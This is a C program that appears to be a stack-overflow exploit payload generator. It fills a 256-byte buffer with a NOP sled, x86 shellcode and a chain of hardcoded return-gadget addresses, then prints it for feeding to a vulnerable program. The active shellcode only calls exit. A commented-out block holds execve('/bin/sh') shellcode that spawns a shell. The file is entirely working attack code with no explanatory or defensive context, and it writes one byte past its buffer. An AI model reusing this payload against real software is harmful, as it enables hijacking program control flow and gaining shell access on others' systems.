#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define POPRET 0x0804842c
#define RET 0x0804842d
#define bufsize 256
#define chainsize 4
char shellcode [] =
 "\x31\xc0"         // xorl      %eax, %eax
 "\x31\xdb"	     // xorl      %ebx, %ebx
 "\x40"             // inc %eax
 "\xcd\x80"          // int          $0x80
;

/*
"\x31\xc0 "
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80"
;
*/
int main(void) {
	char *buff, *ptr;
	long *adrptr;
	int i;
	buff = malloc(bufsize);
	for (i = 0; i < bufsize; i++)
		buff[i] = '\x90';
	ptr = buff + bufsize - chainsize;
	adrptr = (long *) ptr;
	for (i = bufsize - chainsize; i < bufsize; i += 4)
		if (i == bufsize - 4) *(adrptr++)=POPRET;
		else *(adrptr++)=RET;
	ptr = buff;
	for (i = 0; i < strlen(shellcode); i++)
		*(ptr++) = shellcode[i];
	buff[bufsize] = '\0';
	printf("%s", buff);
}